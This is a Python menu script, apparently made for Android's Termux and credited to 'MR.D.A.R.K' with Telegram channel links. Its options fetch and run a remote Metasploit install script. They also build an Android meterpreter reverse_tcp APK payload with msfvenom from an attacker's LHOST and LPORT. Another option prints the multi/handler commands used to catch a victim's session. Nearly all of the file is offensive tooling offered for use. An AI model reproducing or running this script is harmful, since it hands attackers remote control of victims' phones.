from os import system
from time import sleep
from colorama import Fore
import platform
print("")

print(Fore.LIGHTGREEN_EX+"Start scrypt.........")
sleep(1)
system("clear")
print("")
print(Fore.LIGHTRED_EX+"""

     .:okOOOkdc'           'cdkOOOko:.
    .xOOOOOOOOOOOOc       cOOOOOOOOOOOOx.
   :OOOOOOOOOOOOOOOk,   ,kOOOOOOOOOOOOOOO:
  'OOOOOOOOOkkkkOOOOO: :OOOOOOOOOOOOOOOOOO'
  oOOOOOOOO.MMMM.oOOOOoOOOOl.MMMM,OOOOOOOOo
  dOOOOOOOO.MMMMMM.cOOOOOc.MMMMMM,OOOOOOOOx
  lOOOOOOOO.MMMMMMMMM;d;MMMMMMMMM,OOOOOOOOl
  .OOOOOOOO.MMM.;MMMMMMMMMMM;MMMM,OOOOOOOO.
   cOOOOOOO.MMM.OOc.MMMMM'oOO.MMM,OOOOOOOc
    oOOOOOO.MMM.OOOO.MMM:OOOO.MMM,OOOOOOo
     lOOOOO.MMM.OOOO.MMM:OOOO.MMM,OOOOOl
      ;OOOO'MMM.OOOO.MMM:OOOO.MMM;OOOO;
       .dOOo'WM.OOOOocccxOOOO.MX'xOOd.
         ,kOl'M.OOOOOOOOOOOOO.M'dOk,
           :kk;.OOOOOOOOOOOOO.;Ok:
             ;kOOOOOOOOOOOOOOOk:
               ,xOOOOOOOOOOOx,
                 .lOOOOOOOl.
                    ,dOd,
                      .
""")
print("")
print(Fore.LIGHTYELLOW_EX+"coding: "+Fore.LIGHTCYAN_EX+"MR.D.A.R.K")
print(Fore.LIGHTYELLOW_EX+"Version: "+Fore.LIGHTCYAN_EX+"1.0\n")
print(Fore.LIGHTYELLOW_EX+"Telegram chanell: "+Fore.LIGHTCYAN_EX+"https://t.me/DARK_MICE")
print(Fore.LIGHTYELLOW_EX+"Telegram chanell 2: "+Fore.LIGHTCYAN_EX+"https://t.me/Cyber_Seven")
print(Fore.LIGHTYELLOW_EX+"Telegram ID: "+Fore.LIGHTCYAN_EX+"https://t.me/Firabil451")

py = input(Fore.LIGHTBLUE_EX+"""
1) Install Metasploit
2) Crate Pyload
3) Shenod Target
4) update Scrypt     
00) Exit
$#Pyload: """)

if py == "1":
    print("\n")
    print(Fore.LIGHTGREEN_EX+"Install Metasploit")
    sleep(1)
    system("clear")
    system("apt update")
    system("apt upgrade")
    system("wget https://raw.githubusercontent.com/gushmazuko/metasploit_in_termux/master/metasploit.sh")
    system("chmod +x metasploit.sh")
    system("./metasploit.sh")
if py == "2":
    L = input(Fore.LIGHTYELLOW_EX+"LHOST (.z.g 127.0.0.1): "+Fore.LIGHTCYAN_EX)
    P = input(Fore.LIGHTYELLOW_EX+"LPORT (.z.g 7777): "+Fore.LIGHTCYAN_EX)
    name = input(Fore.LIGHTYELLOW_EX+"APK (.z.g pyload.apk): "+Fore.LIGHTCYAN_EX)
    print("")
    sleep(2)
    print(Fore.LIGHTGREEN_EX+"[+]"+Fore.LIGHTWHITE_EX+"LHOST: "+L)
    print(Fore.LIGHTGREEN_EX+"[+]"+Fore.LIGHTWHITE_EX+"LPORT: "+P)
    print(Fore.LIGHTGREEN_EX+"[+]"+Fore.LIGHTWHITE_EX+"APK: "+name+"\n")
    sleep(1)
    print(Fore.LIGHTGREEN_EX+"[*]"+Fore.LIGHTWHITE_EX+"Download Pyload"+"\n")
    sleep(3)
    system("msfvenom -p android/meterpreter/reverse_tcp LHOST="+L+" LPORT="+P+" R > /sdcard/"+name)
    print("")
    print(Fore.LIGHTGREEN_EX+"[+]"+Fore.LIGHTWHITE_EX+"Install Pyload"+"\n")
    print(Fore.LIGHTGREEN_EX+"[+]"+Fore.LIGHTWHITE_EX+"Seveing: /sdcard/"+name+"\n")

if py == "3":
    print(Fore.LIGHTGREEN_EX+"Type exploit:")
    print("")
    print(Fore.LIGHTCYAN_EX+" msfconsole")
    print(Fore.LIGHTCYAN_EX+" use exploit/multi/handler")
    print(Fore.LIGHTCYAN_EX+" set pyload android/meterpreter/reverse_tcp")
    print(Fore.LIGHTCYAN_EX+" set LHOST")
    print(Fore.LIGHTCYAN_EX+" set LPORT")
    print(Fore.LIGHTCYAN_EX+" exploit")
    sleep(1)
    print("")
if py == "4":
    system("apt update")
    system("apt upgrade")
    system("pkg install python")
    system("pkg install git")
    system("exit()")
if py == "00":
    exit()
